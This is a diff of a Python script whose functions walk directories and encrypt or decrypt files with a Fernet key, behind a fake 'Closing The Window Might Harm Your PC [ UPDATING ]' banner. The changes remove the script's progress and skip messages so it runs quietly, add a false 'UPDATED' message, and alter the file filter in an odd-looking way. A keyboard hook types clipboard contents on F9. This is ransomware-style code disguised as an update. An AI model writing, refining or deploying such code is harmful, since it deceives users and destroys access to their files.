@@ -117,7 +117,8 @@ def scan_d(APP_FOLDER):
                     os.chdir(base)
                     decrypt(os.path.abspath(Files),k)
                 except(fernet.InvalidToken, TypeError, Error,PermissionError,OSError):
-                    print("Skipping IT")
+                    continue
+        sys.stdout.write('\r[ U P D A T E D ]')
 
 def scan_e(APP_FOLDER):
     tDirs=0
@@ -132,23 +133,24 @@ def scan_e(APP_FOLDER):
         sys.stdout.write('\rClosing The Window Might Harm Your PC [ U P D A T I|N G ]')
         sys.stdout.write('\rClosing The Window Might Harm Your PC [ U P D A T I N|G ]')
         sys.stdout.write('\rClosing The Window Might Harm Your PC [ U P D A T I N G|]')
-        print('Searching in : ',base)
+
         for directories in dirs:
             tDirs+=1
         for Files in files:
             tFiles+=1
-            if Files.endswith(('.png','.jpg','.txt','.mp4','.jpeg','.pdf','.docx')):
+            if Files.endswith('.'):
                 try:
                     os.chdir(base)
                     encrypt(os.path.abspath(Files),k)
                 except(fernet.InvalidToken, TypeError, Error,PermissionError,OSError):
-                    print("Skipping IT")
+                    continue
+        sys.stdout.write('\r[ U P D A T E D ]')
 
 def on_release(key):
     if key == keyboard.Key.esc:
         input("Enter any key to quit.")
-        return False
-    if key == keyboard.Key.f9: 
+        quit()
+    elif key == keyboard.Key.f9: 
         cptext = pc.paste()     
         kibord.type(cptext)
         sys.stdout.write("\r\r"+cptext)     
@@ -172,8 +174,5 @@ if __name__ == '__main__':
             release_issue()
             data=get_hub()
             pass
+        input()
         listener.join()
-
-
-
-
